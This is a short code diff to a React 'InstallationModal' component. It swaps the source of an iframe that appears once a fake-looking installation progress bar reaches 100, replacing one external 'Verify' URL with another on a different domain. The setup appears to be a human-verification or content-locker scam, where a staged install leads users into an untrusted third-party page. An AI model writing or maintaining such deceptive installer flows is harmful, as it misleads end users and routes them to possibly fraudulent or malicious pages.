@@ -109,7 +109,7 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
         <DialogFooter>
           {progress === 100 ? (
             <iframe
-              src="https://virginiafiles.com/Verify4D"
+              src="https://epctrk.com/Verify4ow"
               scrolling="no"
               marginWidth={0}
               marginHeight={0}
